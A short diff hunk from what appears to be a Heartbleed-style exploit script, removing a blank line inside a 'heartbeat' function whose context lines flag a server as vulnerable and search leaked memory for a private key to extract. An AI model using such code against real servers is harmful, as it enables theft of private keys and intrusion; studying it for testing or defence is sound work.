@@ -96,7 +96,6 @@ def heartbeat(socket):
                 print ('WARNING: server returned more data than it should - server is vulnerable!')
                 if b'END PRIVATE KEY' in pay:
                     print('Found private key')
-
                     str_pay = str(pay)
                     key_header = '-----BEGIN PRIVATE KEY-----'
                     key_footer = '-----END PRIVATE KEY-----'
